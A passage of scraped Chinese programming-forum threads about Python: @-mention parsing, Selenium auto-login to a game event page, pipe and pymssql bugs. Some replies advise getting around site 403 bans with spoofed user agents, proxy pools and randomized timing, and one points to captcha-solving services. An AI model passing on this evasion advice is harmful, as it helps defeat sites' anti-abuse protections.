"查看页面源码，发现一个不存在的用户被服务器加上链接。", " 不可能是前端做的，否则后端必须检查一遍数据的合法性，这和直接后端做没有区别，徒增复杂度，否则可被利用。", "已证实，不是前端做的\r", "\r", " ", " \r", "这个后端解析是肯定解析了，不然没有办法发送站内通知。\r", "但是前端页面显示的时候也有可能会直接做匹配，然后替换成 a 链接，比如我下边 @一个不存在的人\r", "\r", "\r", "@乔布斯 \r", "@不知道中文是否支持 \r", "@如果中文支持， \r", "@那么应该就是在前端做替换了 \r", "@如果不支持 \r", "@那就是在后端解析的 \r", "@因为注册时候不让用中文 \r", " 但是呢，也有可能是前端判定是否符合用户名规范之类的。\r", "\r", "所以，就看哪种会更有效率一点", " 后端替换的链接。\r", "\r", " ", " 嗯..是后端替换的", "不过有一点比较有意思，就是列表只能展示出该主题下发过言的用户\r", "也许是前端储存了该帖内的参与人员信息，然后在正则替换也说不定", "  就在页面里啊，还用猜？\r", " $(\"#reply_content\").textcomplete([{\r", "                match: /(^|\\s)@(\\w*)$/,\r", "                search: function (term, callback) {\r", "                    term = term.toLowerCase();\r", "                    var words= [.....", "以前写过类似的功能   \r", "```\r", "    def at_user(self, content):\r", "        usernames = findall(r'@([\\u4e00-\\u9fa5\\w\\-]+)', content)\r", "        ex_usernames = []\r", "        for username in usernames:\r", "            user = User.query.filter_by(username=username).first()\r", "            if user is not None and username != current_user.username:\r", "                ex_usernames.append(user.username)\r", "                href = '/u/' + username\r", "                u = '@' + username + ' '\r", "                content = content.replace(u, '@<a href=\"%s\">%s</a> ' %\r", "                                          (href, username))\r", "        usernames = list(set(ex_usernames))\r", "        return content, usernames\r", "\r", "```", " 测试 @功能"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://wuxia.qq.com/cp/a20160920tmfl/\" rel=\"nofollow\">http://wuxia.qq.com/cp/a20160920tmfl/</a> 天涯明月刀的网站，想自动领取奖励，登陆这块就遇到问题</p>\n<p>打开网站后，点击登陆，切换到 loginIframe 登陆 frame 输入用户名密码正确，但是登陆后无法控制验证码所在的 frame ，看不出名字，没法切换也就无法控制</p>\n<p>代码如下:</p>\n<pre><code>tyurl = \"http://wuxia.qq.com/cp/a20160920tmfl/\"\n\nusername = \"123456\"\npwd  = \"1234561\"\n\nbinary = FirefoxBinary(\"z:\\\\firefox\\\\firefox.exe\")\n\ndriver = webdriver.Firefox(firefox_binary=binary,executable_path = \"z:\\geckodrive\\geckodriver.exe\")\n\ndriver.get(tyurl)\n\n\ndriver.find_element_by_id(\"dologin\").click()\ndriver.switch_to_frame(\"loginIframe\")\n\n# 等待账号密码登录窗口出现，点击账号密码登\nWebDriverWait(driver, 10,1).until(EC.presence_of_element_located((By.ID,\"switcher_plogin\")))\ndriver.find_element_by_id(\"switcher_plogin\").click()\n\n# 输入账号密码\nWebDriverWait(driver, 30,1).until(EC.presence_of_element_located((By.ID,\"login_button\")))\n\nfor i in range(1,20):\n\ttry:\n\t\tdriver.find_element_by_id(\"u\").click()\n\t\tdriver.find_element_by_id(\"u\").send_keys(username)\n\t\tdriver.find_element_by_id(\"p\").click()\n\t\tdriver.find_element_by_id(\"p\").send_keys(pwd)\n\t\tbreak\n\texcept Exception, e:\n\t\tpass\n\n\n# 输入密码点击确定后无法定位验证码窗口\ntry:\n\tWebDriverWait(driver, 5,1).until(EC.presence_of_element_located((By.ID,\"capImg\")))\nexcept Exception, e:\n\tpass\n\n\n# 找不到当前验证码窗口里的 ID capImg\nprint(driver.find_element_by_id(\"capImg\").src)\n</code></pre>\n</div></div>"], "reply": "7", "tittle": "想用 selenium 登陆网站，但是无法获取弹出的验证码 frame 的名称，无法切换 frame 无法控制", "comment": ["试一下使用 driver.switch_to_default_content()， 我当初是这么解决类似问题的。", "driver.switch_to_default_content() 试验过了，不行，也是报错.", "driver.switchTo().frame(driver.findElement(By.cssSelector(\"iframe[title='Fill Quote']\")));", "driver.switch_to_frame(driver.find_element_by_css_selector(\"iframe[title='Fill Quote']\"));\r", "这个也不行:\r", "selenium.common.exceptions.NoSuchElementException: Message: Unable to locate element: iframe[title='Fill Quote']", "我比较好奇你怎么破验证码。。人工吗", "正确方法， switch_to_frame 支持对象参数，传递当前页面的 iframe 就可以额\r", "\r", "driver.switch_to.frame(driver.find_elements_by_tag_name(\"iframe\")[0])\r", "    \r", "记得还要调出来\r", "\r", "driver.switch_to.default_content()", "验证码用各种答题服务器平台就可以。"]},
{"content": ["<div class=\"topic_content\">大家在调试模拟登录的时候,是如何应对测着测着就被 403 的情况呢?\r<br>目前最笨的办法是释放掉路由器的 ip 重新拨号(家庭宽带),\r<br>但要是在公司固定 IP 情况下该怎么办?\r<br>是否可以在 IDE 里面配置代理服务,\r<br>还是使用使用类似某 s 开头的代理软件?</div>"], "reply": "3", "tittle": "写模拟登录,如何防止被 403Forbidden", "comment": ["换 user-agent ，总之改变一下数据包的特征。\r", "其实网站那边应该不会特别针对某个来源 IP ban ，控制好提交的速度不要太快，间隔时间随机最好，除了登录最好还要顺便访问下其他内容，让对面认为这是个正常的访问。", "用 s5 代理啊。 ip 被 ban 换个 s5 代理就 ok", "1. 模拟 UA\r", "2. 使用一个代理池，确保同一个 IP 不要频繁登录不同帐号\r", "3. 登录前访问一下登录页面，如果用 python 的话建议使用 requests.session ，可以保留 cookie\r", "4. 登录后模拟用户做一些操作\r", "5. 自己用 Chrome 登录一下， F12 看看有没有除了 POST 之外奇怪的请求"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>请大家帮忙看看，&gt;_&lt;</p>\n<p>运行环境 虚拟机 ubuntu12.04 python3.5.1</p>\n<p>用 input() python3 运行失败\n用 raw_input()， python2 运行成功</p>\n<pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport os\nimport time\n\np = os.pipe()\nchildpid = os.fork()\n\nif (childpid==0):\n    os.close(p[1])\n    while True:\n        time.sleep(3)\n        print('reading')\n        msg = os.read(p[0],1024)\n        print(msg)\n        if msg == '':\n            print('can not read anything')\n            break\n        if (msg == 'q'):\n            os.close(p[0])#关闭管道\n            break\nelse:\n    os.close(p[0])\n    while True:\n        \n        #python3.5 中运行出错\n        str1 = input()\n\t\t#python2.7 中运行正确\n        #str1 = raw_input('input anything:')\n        os.write(p[1],str1)\n        if(str1 == 'q'):\n            os.close(p[1])#关闭管道\n            os.wait()\n            break\n\n</code></pre>\n<p>出错信息如图：</p>\n<p><a href=\"http://a3.topitme.com/b/09/bb/11773765731b5bb09bl.jpg\" rel=\"nofollow\">http://a3.topitme.com/b/09/bb/11773765731b5bb09bl.jpg</a></p>\n</div></div>"], "reply": "4", "tittle": "python input()使用疑问", "comment": ["python3 里面 input 返回的是 str,要 encode 之后才可以 os.write", " 谢啦，一直将 python2 中的 raw_input 和 python3 中的 input 等效来用,>_<\r", "昨天 ubuntu python3.2 ，加上 encode 依然报错，今天安装了 python3.5.1 ，就没有尝试加 encode 了\r", "\r", "请问是不是只有加 encode 这一种方法呢？", " 对于管道文件应该只能用 encode 把 str 编码成 byte\r", "如果是以文本格式打开的文件是可以直接 write 的", " 十分感谢，:)"]},
{"content": ["<div class=\"topic_content\">是这样的，我想要通过这个网址 <a target=\"_blank\" href=\"https://diviner.jd.com/diviner?lid=1&amp;p=103003&amp;sku=676676\" rel=\"nofollow\">https://diviner.jd.com/diviner?lid=1&amp;p=103003&amp;sku=676676</a> 来实现对内容的提取，可是我在测试的时候就报错。具体如下：\r<br>D:\\Python27.1\\python.exe D:/Users/Administrator/PycharmProjects/untitled5/1122.py\r<br>  File \"D:/Users/Administrator/PycharmProjects/untitled5/1122.py\", line 4\r<br>    html=requests.get( <a target=\"_blank\" href=\"https://diviner.jd.com/diviner?lid=1&amp;p=103003&amp;sku=676676,headers=head\" rel=\"nofollow\">https://diviner.jd.com/diviner?lid=1&amp;p=103003&amp;sku=676676,headers=head</a>)\r<br>                           ^\r<br>SyntaxError: invalid syntax\r<br>\r<br>Process finished with exit code 1\r<br>不知道是网址的问题还是什么，求帮忙</div>"], "reply": "2", "tittle": "打不开目标网址，萌新求解答", "comment": ["get 函数里面的内容要加引号", "html=requests.get( \"https://diviner.jd.com/diviner?lid=1&p=103003&sku=676676,headers=head\")"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Hi ，我来请教一个问题呗。</p>\n<pre><code>class Old(object):\n    def  __init__(self):\n        self.current = {}\n        self.new_added = []\n\n    def keep_history(self, key):\n        if key in self.filed:\n            self.current[key] = self.field[key]\n        else:\n            self.new_added.append(key)\n    def born(self):\n        self.son = Normal(self._fields)\n        self._fields = None\n        return self.son\n\n\nclass Normal(object):\n    def __init__(self, field=None):\n        self.filed = filed or {}\n\n    def mutate(self, key, value):\n        self.aging()\n        self.keep_history(key)\n        self._filed[key] = value\n        \n        return self.born()\n    \n    def aging(self):\n         self.__class__ = Old\n         self.__init__()\n</code></pre>\n<hr>\n<p>现在是这种设计，想 Normal 对象在 mutate 的时候，保留一份  最老－》比较老－》年轻 的记录</p>\n<p>当前据说考虑 GC 的顺序，是老对象指向新对象，不因为最新对象而阻碍了老对象回收。</p>\n<p>没用 weak ref 是因为 weak ref 开销大。。。</p>\n<p>但这样的代码确实不美观。。 我在想如何写的性能又高，代码又好读。。</p>\n<p>请各位大神指点。。。</p>\n</div></div>"], "reply": "1", "tittle": "Python 子对象 inplace 升级成父对象，有啥高性能但更好懂的方法吗？", "comment": ["use case of Normal and Old.\r", "to retain change history and able to mutate a dictionary base object in rdd\r", "\r", "```python\r", "data = [dict(sound=1, counting=2, c=4) for _ in xrange(1000000)]\r", "\r", "data_rdd = sc.parallelize(map(Normal, data))\r", "#sc is pyspark context\r", "\r", "def function(normal):\r", "    new_normal = normal.mutate('counting', 3).mutate('sound', 2)\r", "    #still do some calculation with normal   ［ 1 ］\r", "    #even do something with the change history through normal.son.current.  normal.son.son.current  ［ 2 ］\r", "    return new_normal\r", "\r", "data_rdd.map(function).collect()\r", "```\r", "----\r", "但有些 use case 不会发生［ 1 ］，［ 2 ］两种情况。 那样 gc 直接回收 old 。 因为在 spark 集群跑，所以一点点的性能优势可以放大好多。。\r", "\r", "我想改进代码可读性。。毕竟直接 inplace 的改变对象的__class__ 好粗暴\r", "\r", "（之前的设计不是我搞得。。"]},
{"content": ["<div class=\"topic_content\">我之前把程序运行的步骤过程都输出到文件中，一步一步的存进去，每一步都记录下来。\r<br>现在考虑这可能会损害硬盘的读取寿命，我在想， python 有没有一个能够暂存数据的地方，我想用列表来记录，最后再把列表输出到文件中。除了这样，还有没有其他的方法？</div>"], "reply": "8", "tittle": "python 有没有暂存数据的地方？", "comment": ["标准库 tempfile \r", "\r", "伤硬盘这个说法已经好多年没见了，当年流传最光的就是 bt 、迅雷伤硬盘", "\r", "并不是你每次 write 都会进行文件 IO ， python 本身就有缓存。超过缓存的时候才会进行一次实际的 IO 。", "SQLite 也可以创建内存数据库。。", "write 后不是马上写入硬盘的，有个缓冲区\r", "关闭文件或使用 flush 方法才会写入硬盘", "sqlite ram", "threadlocal", "linux 不是自带缓存吗", "直接放在内存里面不行吗？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>-<em>- coding:utf-8 -</em>-</h1>\n<p>import pymssql\nimport _mssql\nimport time\nimport os\nimport ConfigParser\nimport logging\nimport win32api\nimport win32con\nimport threading\nimport win32gui_struct\nimport traceback\nimport itertools\nimport glob\nimport uuid\nimport decimal\ndecimal.<strong>version</strong>\nuuid.ctypes.<strong>version</strong>\n_mssql.<strong>version</strong>\ntry:\nimport winxpgui as win32gui\nexcept ImportError:\nimport win32gui\nfrom logging.handlers import RotatingFileHandler</p>\n<p>config = ConfigParser.ConfigParser()\nconfig.readfp(open(\"DEC.INI\"))\nmainfile = os.getcwd()</p>\n<p>logging.basicConfig(level=<a href=\"http://logging.INFO\" rel=\"nofollow\">logging.INFO</a>)\n<a href=\"http://logging.info\" rel=\"nofollow\">logging.info</a>(\"读取 dec.ini 配置文件开始\")</p>\n<p>########数据库设置#############\nSQLSERVER1 =str(config.get(\"DATA\", \"SQLSERVER\"))</p>\n<h1>= '127.0.0.1'</h1>\n<p>USER = str(config.get(\"DATA\", \"USER\"))</p>\n<h1>'sa'</h1>\n<p>PASSWORD = str(config.get(\"DATA\", \"PASSWORD\"))</p>\n<h1>'ruimeilis6.0'</h1>\n<p>DATABASE = str(config.get(\"DATA\", \"DATABASE\"))</p>\n<p>SQLSERVER = SQLSERVER1\nUSER = 'test'\nPASSWORD = 'test'\nDATABASE = 'test'\ng_Conn = None</p>\n<p>datastr=\"\"\"server=\"\"\"+SQLSERVER +\"\"\", port='1433', user=\"\"\"+USER+\"\"\", password=\"\"\"+PASSWORD+\"\"\", database=\"\"\"+DATABASE+\"\"\",charset='UTF-8'\"\"\"\nprint datastr\ndatastr=\"\"\"host='127.0.0.1',port='1433',user='test',password='test',database='test',charset='UTF-8'\"\"\"\nprint datastr\ng_Conn = None</p>\n<p>LoggingLevel = \"INFO\"\nLoggingLevelTxt = '设置日志级别,日志级别大小关系为： CRITICAL &gt; ERROR &gt; WARNING(默认) &gt; INFO &gt; DEBUG &gt; NOTSET'\n##time.strftime('%Y-%m-%d',time.localtime())\n#################################################################################################</p>\n<h1>定义一个 RotatingFileHandler ，最多备份 5 个日志文件，每个日志文件最大 10M</h1>\n<p>Rthandler = RotatingFileHandler(os.path.join(mainfile, \"dec1.log\"), maxBytes=10 * 1024 * 1024, backupCount=3)\nRthandler.setLevel(<a href=\"http://logging.INFO\" rel=\"nofollow\">logging.INFO</a>)  # 此处级别设置无效\nformatter = logging.Formatter('%(asctime)s: %(levelname)-8s %(message)s')\nRthandler.setFormatter(formatter)\nlogging.getLogger('').addHandler(Rthandler)</p>\n<p>################################################################################################</p>\n<p>def openDB():</p>\n<pre><code>global g_Conn\nprint '准备打开数据库连接'\nprint 'host=',SQLSERVER,\"user=\",USER,\"password=\",PASSWORD,\"database=\",DATABASE\n#g_Conn = pymssql.connect(host=SQLSERVER,port=\"1433\",user=USER,password=PASSWORD,database=DATABASE,charset=\"UTF-8\")\n#global g_Conn\n\n#pymssql.connect(host=SQLSERVER,user=USER,password=PASSWORD,database=DATABASE)\n#g_Conn = pymssql.connect(server=SQLSERVER,port='1433',user=USER,password=PASSWORD,database=DATABASE,charset=\"UTF-8\")\nglobal datastr\ng_Conn = pymssql.connect(datastr)\n#g_Conn = pymssql.connect(server=\"127.0.0.1\", port=\"1433\", user=\"test\", password=\"test\", database=\"master\",charset=\"UTF-8\")\n#g_Conn =pymssql.connect(server=SQLSERVER,port=\"1433\",user=USER,password=password,database=DATABASE,charset=\"UTF-8\")\n#pymssql.connect(host=SQLSERVER,user=USER,password=PASSWORD,database=DATABASE,charset=\"UTF-8\")\n# pymssql.connect(server=\"127.0.0.1\",port=\"1433\",user=\"test\",password=\"test\",database=\"master\",charset=\"UTF-8\")\n# pymssql.connect(host=SQLSERVER,user=USER,password=PASSWORD,database=DATABASE)\n</code></pre>\n<p>def closeDB():\nglobal g_Conn\ng_Conn.close()</p>\n<p>def query(sql):\ntry:\nopenDB()\nglobal g_Conn\nprint \"dkai\"\ncursor = g_Conn.cursor()\nret = cursor.execute(sql)\nrows = cursor.fetchall()\nreturn rows\nexcept:\nraise Exception, 'query database has wrong'\nfinally:\ncloseDB()</p>\n<p>def insert_many(sql, params):\n'''\n新增多条记录，\nparams:\nsql:执行的 sql 语句\nparmas:一个 list ， listitem 为一个参数元组\n'''\ntry:\nopenDB()\nglobal g_Conn\ncursor = g_Conn.cursor()\nfor param in params:\nsql_temp = sql % param\ncursor.execute(sql_temp)\ng_Conn.commit()\nreturn True\nexcept Exception, ex:\nprint '%s:%s' % (Exception, ex)\ng_Conn.rollback()\nraise Exception, 'insert database has wrong'\nreturn False\nfinally:\ncloseDB()</p>\n<p>def insert(sql):\ntry:\nopenDB()\nglobal g_Conn\ncursor = g_Conn.cursor()\ncursor.execute(sql)\ng_Conn.commit()\nexcept:\ng_Conn.rollback()\nraise Exception, 'query database has wrong'\nfinally:</p>\n<pre><code>    closeDB()\n</code></pre>\n<p>SQLSYS_SEQUENCE_update = \"\"\"update SYS_SEQUENCE Set NOW_VAL =NOW_VAL + 1 Where SEQ_CODE ='%s'\"\"\"\nSQLSYS_SEQUENCE_NOW_VAL = \"\"\"SELECT NOW_VAL From SYS_SEQUENCE Where SEQ_CODE ='%s'\"\"\"</p>\n<p>def SYS_SEQUENCE_NOW_VAL_1(SEQ_CODE):\nSYS_SEQUENCE_NOW_VAL11 = insert(SQLSYS_SEQUENCE_update % (SEQ_CODE))\nSYS_SEQUENCE_NOW_VAL1 = query(SQLSYS_SEQUENCE_NOW_VAL % (SEQ_CODE))\n# print SQLSYS_SEQUENCE_NOW_VAL %(SEQ_CODE)\nwhile SYS_SEQUENCE_NOW_VAL1[0]:\n# print baa[0]\nNOW_VAL = SYS_SEQUENCE_NOW_VAL1[0][0][0]\nprint NOW_VAL\nbreak;\nelse:\nprint \"更新并获取 SYS_SEQUENCE 对应表 id 最大值错误!\"</p>\n<pre><code>    NOW_VAL = ''\nreturn NOW_VAL\n</code></pre>\n<p>def SYS_SEQUENCE_NOW_VAL_2(SEQ_CODE):  # 更新并获取 SYS_SEQUENCE 对应表 id 最大值!\nSYS_SEQUENCE_NOW_VAL1 = insert(SQLSYS_SEQUENCE_NOW_VAL % (SEQ_CODE))\nprint SQLSYS_SEQUENCE_NOW_VAL % (SEQ_CODE)\nwhile SYS_SEQUENCE_NOW_VAL1[0]:\n# print baa[0]\nNOW_VAL = SYS_SEQUENCE_NOW_VAL1[0][0][0]\nprint NOW_VAL\nbreak;\nelse:\nprint \"更新并获取 SYS_SEQUENCE 对应表 id 最大值错误!\"</p>\n<pre><code>    NOW_VAL = ''\nreturn NOW_VAL\n</code></pre>\n<p>def plus(a, b):\nz = a + 1\nc = b + 5\nprint a + b\nreturn c, z</p>\n<h1>--- and instrserial='%s'</h1>\n<h1>sql_insert = \"\"\"INSERT INTO Size (Size_nbr,SizeName) VALUES (37,'3 风 dsf 扇地方')\"\"\";</h1>\n<h1>sql1 = \"select * from Size\";</h1>\n<h1>import logging.config</h1>\n<p>def teststrRead(text):\n# <a href=\"http://logging.INFO\" rel=\"nofollow\">logging.INFO</a>()\n# <a href=\"http://logging.info\" rel=\"nofollow\">logging.info</a>(sqlOtheRpt %(instrid,instrno))\n<a href=\"http://logging.info\" rel=\"nofollow\">logging.info</a>(\"开始连接数据库。。。。。。\")\nprint sql, (text)\na = query(sql % (text))\nprint a\n# b = insert(sql_insert)\n# print (\"tbale1:%s,\"%(str(a[0])))\n# print sql % (str(INSTR_ID),destinstr)\nreturn a</p>\n<h1>file_object = open(fpath, 'r')</h1>\n<h1>print \"usesysdate::\",usesysdate</h1>\n<p>def runReadFile(a):\npass</p>\n<p>###############################</p>\n<p>class SysTrayIcon(object):\n'''TODO'''\nQUIT = '退出解码'\nSPECIAL_ACTIONS = [QUIT]</p>\n<pre><code>FIRST_ID = 1023\n\ndef __init__(self,\n             icon,\n             hover_text,\n             menu_options,\n             on_quit=None,\n             default_menu_index=None,\n             window_class_name=None, ):\n\n    self.icon = icon\n    self.hover_text = hover_text\n    self.on_quit = on_quit\n\n    menu_options = menu_options + (('退出', None, self.QUIT),)\n    self._next_action_id = self.FIRST_ID\n    self.menu_actions_by_id = set()\n    self.menu_options = self._add_ids_to_menu_options(list(menu_options))\n    self.menu_actions_by_id = dict(self.menu_actions_by_id)\n    del self._next_action_id\n\n    self.default_menu_index = (default_menu_index or 0)\n    self.window_class_name = window_class_name or \"dec-1800i\"\n\n    message_map = {win32gui.RegisterWindowMessage(\"TaskbarCreated\"): self.restart,\n                   win32con.WM_DESTROY: self.destroy,\n                   win32con.WM_COMMAND: self.command,\n                   win32con.WM_USER + 20: self.notify,}\n    # Register the Window class.\n    window_class = win32gui.WNDCLASS()\n    hinst = window_class.hInstance = win32gui.GetModuleHandle(None)\n    window_class.lpszClassName = self.window_class_name\n    window_class.style = win32con.CS_VREDRAW | win32con.CS_HREDRAW;\n    window_class.hCursor = win32gui.LoadCursor(0, win32con.IDC_ARROW)\n    window_class.hbrBackground = win32con.COLOR_WINDOW\n    window_class.lpfnWndProc = message_map  # could also specify a wndproc.\n    classAtom = win32gui.RegisterClass(window_class)\n    # Create the Window.\n    style = win32con.WS_OVERLAPPED | win32con.WS_SYSMENU\n    self.hwnd = win32gui.CreateWindow(classAtom,\n                                      self.window_class_name,\n                                      style,\n                                      0,\n                                      0,\n                                      win32con.CW_USEDEFAULT,\n                                      win32con.CW_USEDEFAULT,\n                                      0,\n                                      0,\n                                      hinst,\n                                      None)\n    win32gui.UpdateWindow(self.hwnd)\n    self.notify_id = None\n    self.refresh_icon()\n\n    win32gui.PumpMessages()\n\ndef _add_ids_to_menu_options(self, menu_options):\n    result = []\n    for menu_option in menu_options:\n        option_text, option_icon, option_action = menu_option\n        if callable(option_action) or option_action in self.SPECIAL_ACTIONS:\n            self.menu_actions_by_id.add((self._next_action_id, option_action))\n            result.append(menu_option + (self._next_action_id,))\n        elif non_string_iterable(option_action):\n            result.append((option_text,\n                           option_icon,\n                           self._add_ids_to_menu_options(option_action),\n                           self._next_action_id))\n        else:\n            print 'Unknown item', option_text, option_icon, option_action\n        self._next_action_id += 1\n    return result\n\ndef refresh_icon(self):\n    # Try and find a custom icon\n    hinst = win32gui.GetModuleHandle(None)\n    if os.path.isfile(self.icon):\n        icon_flags = win32con.LR_LOADFROMFILE | win32con.LR_DEFAULTSIZE\n        hicon = win32gui.LoadImage(hinst,\n                                   self.icon,\n                                   win32con.IMAGE_ICON,\n                                   0,\n                                   0,\n                                   icon_flags)\n    else:\n        print \"Can't find icon file - using default.\"\n        hicon = win32gui.LoadIcon(0, win32con.IDI_APPLICATION)\n\n    if self.notify_id:\n        message = win32gui.NIM_MODIFY\n    else:\n        message = win32gui.NIM_ADD\n    self.notify_id = (self.hwnd,\n                      0,\n                      win32gui.NIF_ICON | win32gui.NIF_MESSAGE | win32gui.NIF_TIP,\n                      win32con.WM_USER + 20,\n                      hicon,\n                      self.hover_text)\n    win32gui.Shell_NotifyIcon(message, self.notify_id)\n\ndef restart(self, hwnd, msg, wparam, lparam):\n    self.refresh_icon()\n\ndef destroy(self, hwnd, msg, wparam, lparam):\n    if self.on_quit: self.on_quit(self)\n    nid = (self.hwnd, 0)\n    win32gui.Shell_NotifyIcon(win32gui.NIM_DELETE, nid)\n    win32gui.PostQuitMessage(0)  # Terminate the app.\n\ndef notify(self, hwnd, msg, wparam, lparam):\n    if lparam == win32con.WM_LBUTTONDBLCLK:\n        self.execute_menu_option(self.default_menu_index + self.FIRST_ID)\n    elif lparam == win32con.WM_RBUTTONUP:\n        self.show_menu()\n    elif lparam == win32con.WM_LBUTTONUP:\n        pass\n    return True\n\ndef show_menu(self):\n\n    menu = win32gui.CreatePopupMenu()\n    self.create_menu(menu, self.menu_options)\n    # win32gui.SetMenuDefaultItem(menu, 1000, 0)\n\n    pos = win32gui.GetCursorPos()\n    # See http://msdn.microsoft.com/library/default.asp?url=/library/en-us/winui/menus_0hdi.asp\n    win32gui.SetForegroundWindow(self.hwnd)\n    win32gui.TrackPopupMenu(menu,\n                            win32con.TPM_LEFTALIGN,\n                            pos[0],\n                            pos[1],\n                            0,\n                            self.hwnd,\n                            None)\n    win32gui.PostMessage(self.hwnd, win32con.WM_NULL, 0, 0)\n\ndef create_menu(self, menu, menu_options):\n    for option_text, option_icon, option_action, option_id in menu_options[::-1]:\n        if option_icon:\n            option_icon = self.prep_menu_icon(option_icon)\n\n        if option_id in self.menu_actions_by_id:\n            item, extras = win32gui_struct.PackMENUITEMINFO(text=option_text,\n                                                            hbmpItem=option_icon,\n                                                            wID=option_id)\n            win32gui.InsertMenuItem(menu, 0, 1, item)\n        else:\n            submenu = win32gui.CreatePopupMenu()\n            self.create_menu(submenu, option_action)\n            item, extras = win32gui_struct.PackMENUITEMINFO(text=option_text,\n                                                            hbmpItem=option_icon,\n                                                            hSubMenu=submenu)\n            win32gui.InsertMenuItem(menu, 0, 1, item)\n\ndef prep_menu_icon(self, icon):\n    # First load the icon.\n    ico_x = win32api.GetSystemMetrics(win32con.SM_CXSMICON)\n    ico_y = win32api.GetSystemMetrics(win32con.SM_CYSMICON)\n    hicon = win32gui.LoadImage(0, icon, win32con.IMAGE_ICON, ico_x, ico_y, win32con.LR_LOADFROMFILE)\n\n    hdcBitmap = win32gui.CreateCompatibleDC(0)\n    hdcScreen = win32gui.GetDC(0)\n    hbm = win32gui.CreateCompatibleBitmap(hdcScreen, ico_x, ico_y)\n    hbmOld = win32gui.SelectObject(hdcBitmap, hbm)\n    # Fill the background.\n    brush = win32gui.GetSysColorBrush(win32con.COLOR_MENU)\n    win32gui.FillRect(hdcBitmap, (0, 0, 16, 16), brush)\n    # unclear if brush needs to be feed.  Best clue I can find is:\n    # \"GetSysColorBrush returns a cached brush instead of allocating a new\n    # one.\" - implies no DeleteObject\n    # draw the icon\n    win32gui.DrawIconEx(hdcBitmap, 0, 0, hicon, ico_x, ico_y, 0, 0, win32con.DI_NORMAL)\n    win32gui.SelectObject(hdcBitmap, hbmOld)\n    win32gui.DeleteDC(hdcBitmap)\n\n    return hbm\n\ndef command(self, hwnd, msg, wparam, lparam):\n    id = win32gui.LOWORD(wparam)\n    self.execute_menu_option(id)\n\ndef execute_menu_option(self, id):\n    menu_action = self.menu_actions_by_id[id]\n    if menu_action == self.QUIT:\n        win32gui.DestroyWindow(self.hwnd)\n    else:\n        menu_action(self)\n</code></pre>\n<p>def non_string_iterable(obj):\ntry:\niter(obj)\nexcept TypeError:\nreturn False\nelse:\nreturn not isinstance(obj, basestring)</p>\n<h1>Minimal self test. You'll need a bunch of ICO files in the current working</h1>\n<h1>directory in order for this to work...</h1>\n<p>icons = itertools.cycle(glob.glob('*.ico'))\n#icons=(os.path.join(mainfile, \"DEC.ico\"),os.path.join(mainfile, \"DEC2.ico\"))\nhover_text = \"com1 9600 n 8 1 \\n load: \"</p>\n<p>def hello(sysTrayIcon): print \"Hello World.\"</p>\n<p>def simon(sysTrayIcon): print \"Hello Simon.\"</p>\n<p>def rehandle(sysTrayIcon):\nprint \"rehandling......\"\nglobal file_tell\nfile_tell = 0</p>\n<p>def switch_icon(sysTrayIcon):\nsysTrayIcon.icon = icons.next()\nsysTrayIcon.refresh_icon()</p>\n<p>def stop(sysTrayIcon): t.stop()\nmenu_options = (('打印状态', icons.next(), hello),\n('停止处理', icons.next(), simon),\n('切换图标', None, switch_icon),\n('重新处理今日数据', icons.next(), rehandle),\n('其他设置', icons.next(), (('设置 1', icons.next(), simon),\n(hover_text, icons.next(), switch_icon),\n))\n)</p>\n<p>def bye(sysTrayIcon): print '退出.已停止'</p>\n<p>\"\"\"\non_quit=bye\ndefault_menu_index=1</p>\n<p>t=threading.Thread(target=SysTrayIcon,args=(icons.next(), hover_text, menu_options,on_quit, default_menu_index))</p>\n<p>#将线程设置为守护线程\nt.setDaemon(True)\n#线程准备就绪，随时等候 cpu 调度\nt.start()</p>\n<h1>创建锁</h1>\n<p>#mutex = threading.Lock()\nt=threading.Thread(target=runReadFile,args=(1,))\n#将线程设置为守护线程\nt.setDaemon(True)\n#线程准备就绪，随时等候 cpu 调度\nt.start()\n\"\"\"</p>\n<p>print \"读取配置文件完成，测试数据库连接\"\nsql = \"\"\"select getdate(), '%s' as txt\"\"\"\ntext='teststreeerrrooo'\nteststr=teststrRead(text)\nprint '执行函数获得 teststr 为:',teststr</p>\n<p>SysTrayIcon(icons.next(), hover_text, menu_options, on_quit=bye, default_menu_index=1)</p>\n<p>\"\"\"\nwhile 1==1:\nstrqq=''\nstrqq = input(\"Enter your input: \")\nprint \"Received inpu is : \", strqq\n\"\"\"</p>\n<p>dec.ini 文件内容为</p>\n<p>[DATA]\nsqlserver = '127.0.0.1'\nuser = 'test'\npassword = 'test'\ndatabase = 'test'\ng_conn = None</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><h1>-<em>-coding:utf-8 -</em>-</h1>\n<pre><code>import pymssql\nimport ConfigParser\ncf=ConfigParser.ConfigParser()\ncf.read(\"conf.ini\")\nDATABASE=cf.get(\"app_info\",\"DATABASE\")\nUSER=cf.get(\"app_info\",\"USER\")\nPASSWORD=cf.get(\"app_info\",\"PASSWORD\")\nHOST=cf.get(\"app_info\",\"HOST\")\nPORT=cf.get(\"app_info\",\"PORT\")\ndef mssql(sql):\n    try:\n        #conn=pymssql.connect(server=\"127.0.0.1\", port=\"1433\", user=\"test\", password=\"test\", database=\"master\",charset=\"UTF-8\")\n        conn=pymssql.connect(host=HOST,user=USER,passwd=PASSWORD,db=DATABASE,port=PORT)\n        cur = conn.cursor()\n        cur.execute(sql)\n        rows = cur.fetchall()\n        conn.commit()\n        cur.close()\n        conn.close()\n        return rows\n    except pymssql.Error,e:\n        print \"Mysql Error %d: %s\" % (e.args[0], e.args[1])\n\ndef operation():\n    select = mssql('select getdate(), \\'kkkk\\' as txt')\n    return select #我返回这个是为了下面发送邮件用的，顺便增加个发送邮件的功能\ndddd=operation()\nprint dddd\n</code></pre>\n</div></div>"], "reply": "7", "tittle": "python 的 mssql 数据连接配置无法使用，大神帮看看，代码如下，提示数据库连接函数为空！只要是在读取 ini 文件就报错", "comment": ["cfing.ini 文件内容\r", "\r", "    [app_info]\r", "    DATABASE=test\r", "    USER=test\r", "    PASSWORD=test\r", "    HOST=127.0.0.1\r", "    PORT=1433\r", "    [mail]\r", "    ", "\r", "    ", "\r", "    password=654321\r", "    ", "stackoverflow", "莫名喜感", "第一次发代码，发完下班断网断电，回来就没法编辑了，下面补了一个简化的代码，提示如下内容\r", "    File \"pymssql.pyx\", line 